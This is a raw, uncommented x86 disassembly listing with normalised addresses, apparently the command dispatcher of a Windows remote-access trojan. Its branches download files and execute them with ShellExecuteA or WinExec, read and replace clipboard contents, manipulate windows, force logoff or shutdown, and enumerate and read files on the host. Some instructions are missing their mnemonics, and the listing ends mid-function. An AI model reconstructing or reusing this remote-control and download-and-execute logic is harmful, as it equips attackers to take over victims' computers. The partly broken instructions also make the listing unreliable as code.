call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x94 ]
lea ecx [ ebp - 0x188 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x30 ]
jmp r-xdata
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x188 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea ecx [ ebp - 0x188 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
xor esi esi
push 0x1
push esi
push esi
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
push esi
call [ ShellExecuteA@IAT ]
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
push eax
call sub_40ecdd
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_406988
jmp r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
call sub_40c9dd
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp + 0xb ]
push r--data
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor esi esi
lea ecx [ ebp - 0x30 ]
push esi
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call URLDownloadToFileA
test eax eax
jne r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
push eax
call [ CloseWindow@IAT ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
add eax 0x10000
push eax
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x0
call [ MessageBoxA@IAT ]
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp + 0xb ]
push r--data
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
push 0x32
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x188 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x188 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
sub esp 0x10
lea eax [ ebp - 0x30 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_406d29
add esp 0x10
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x3
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
push eax
call sub_40e46d
lea ecx [ ebp - 0x188 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x30 ]
jmp r-xdata
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x188 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea ecx [ ebp - 0x188 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
sub esp 0x10
lea eax [ ebp - 0x30 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_406d29
add esp 0x10
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x9
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
push eax
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
push eax
call sub_40e414
add esp 0xc
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
push eax
push 0x1
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
push eax
call [ GetWindowThreadProcessId@IAT ]
push [ ebp + 0x8 ]
call sub_40ecdd
pop ecx
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
push eax
call [ ShowWindow@IAT ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
jne r-xdata
call sub_40ca41
push r--data
push 0x1
pop esi
lea ecx [ ebp - 0x10 ]
push esi
call sub_401289
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x5
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ WinExec@IAT ]
jmp r-xdata
push 0x0
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push r--data
push esi
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
xor edi edi
push edi
push edi
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call sub_40e8b9
pop ecx
lea eax [ ebp - 0x30 ]
mov edx esp
push eax
push esi
lea eax [ ebp - 0x44 ]
push r--data
push eax
mov [ ebp + 0x8 ] edx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
mov eax [ ebp + 0x8 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
jmp r-xdata
push 0x1
call [ GetClipboardData@IAT ]
mov esi eax
push esi
call [ GlobalLock@IAT ]
push esi
mov edi eax
call [ GlobalUnlock@IAT ]
call [ CloseClipboard@IAT ]
test edi edi
jne r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x0
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
push r--data
push esi
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
xor edi edi
push edi
push esi
jmp r-xdata
call [ ExitWindowsEx@IAT ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
xor esi esi
push 0x1
push esi
push esi
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
push esi
call [ ShellExecuteA@IAT ]
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x44 ]
mov esi esp
push edi
push rw-data
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x44 ]
jmp r-xdata
mov edi r--data
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x0
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
call [ EmptyClipboard@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
inc eax
push eax
push 0x2000
call [ GlobalAlloc@IAT ]
mov ebx eax
push ebx
call [ GlobalLock@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] eax
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ ebp + 0x8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call [ GlobalUnlock@IAT ]
push ebx
push 0x1
call [ SetClipboardData@IAT ]
jmp r-xdata
xor edi edi
xor edi edi
push edi
push 0x2
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
push r--data
push esi
lea ecx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] eax
call sub_401289
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
call sub_4052ec
jmp r-xdata
call [ EmptyClipboard@IAT ]
call [ CloseClipboard@IAT ]
push r--data
push esi
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push edi
push edi
push edi
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x2
jmp r-xdata
mov ecx rw-data
call sub_4021c7
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
and [ ebp - 0x50 ] 0x0
and [ ebp + 0x8 ] 0x0
lea eax [ ebp - 0x50 ]
lea ecx [ ebp - 0x10 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40e750
add esp 0xc
cmp al 0x1
jne r-xdata
pop ecx
jmp r-xdata
push edi
push edi
push esi
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
mov ecx rw-data
pop ecx
pop ecx
jmp r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
push eax
call sub_40da55
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
call sub_406055
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4052ec
push [ ebp + 0x8 ]
call sub_40fc2c
jmp r-xdata
call [ ebp + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
and [ ebp - 0x2c ] 0x0
xor eax eax
lea edi [ ebp - 0x2b ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x2c ]
push eax
call [ GetKeyboardLayoutNameA@IAT ]
sub esp 0x10
lea eax [ ebp - 0x2c ]
mov edi esp
push eax
lea eax [ ebp - 0x20 ]
push esi
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x44 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40d18e
jmp r-xdata
pop ecx
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
mov ecx rw-data
call sub_40425f
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_409d91
add esp 0x10
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
mov ecx rw-data
call sub_404336
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x0
mov ecx rw-data
call sub_403d9a
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
mov [ rw-data ] 0x1
call sub_401289
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x1
mov ecx rw-data
call sub_403d9a
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
mov ecx rw-data
call sub_40520c
jmp r-xdata
and [ rw-data ] 0x0
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push r--data
lea eax [ ebp - 0x74 ]
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea eax [ ebp - 0x2cc ]
lea ecx [ ebp - 0x74 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ FindFirstFileA@IAT ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp + 0xb ]
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x31 ]
push r--data
push eax
lea eax [ ebp - 0x2a0 ]
push eax
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
call [ std::operator!=@IAT ]
pop ecx
mov [ ebp + 0xb ] al
pop ecx
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0xb ] 0x0
je r-xdata
push 0x0
push 0x0
call sub_405f6c
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
push r--data
lea eax [ ebp - 0x44 ]
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
push 0x24
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x18c ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x18c ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
lea eax [ ebp - 0x2cc ]
push eax
push [ ebp - 0x50 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp + 0xb ]
lea ecx [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x2cc ]
push 0x140
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x44 ]
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ecx rw-data
call sub_402109
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402168
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ ebp - 0x18c ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x74 ]
jmp r-xdata
lea eax [ ebp + 0xb ]
lea ecx [ ebp - 0x30 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x18c ]
push eax
call [ std::basic_istream<char,struct std::char_traits<char> >::tellg@IAT ]
push 0x6
mov esi eax
pop ecx
lea edi [ ebp - 0xac ]
[ edi ] [ esi ]
lea ecx [ ebp - 0xac ]
call sub_405288
push eax
call ??2@YAPAXI@Z
pop ecx
mov edi eax
push 0x0
push 0x0
lea ecx [ ebp - 0x18c ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
lea ecx [ ebp - 0xac ]
call sub_405288
push eax
push edi
lea ecx [ ebp - 0x18c ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
lea ecx [ ebp - 0x18c ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
push 0x1b
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x30 ]
mov edx esp
push eax
push esi
lea eax [ ebp - 0x44 ]
push r--data
push eax
mov [ ebp + 0x8 ] edx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
mov eax [ ebp + 0x8 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
jmp r-xdata
lea eax [ ebp - 0x31 ]
push r--data
push eax
lea eax [ ebp - 0x2a0 ]
push eax
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
call [ std::operator!=@IAT ]
pop ecx
mov [ ebp + 0xb ] al
pop ecx
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0xb ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
call [ rw-data ]
mov ecx rw-data
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x44 ]
mov esi esp
push rw-data
push rw-data
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x44 ]
sub esp 0x10
lea eax [ ebp - 0x44 ]
mov esi esp
push rw-data
push rw-data
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x44 ]
jmp r-xdata
lea eax [ ebp + 0xb ]
lea ecx [ ebp - 0xac ]
push eax
call sub_405288
push eax
push edi
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x44 ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
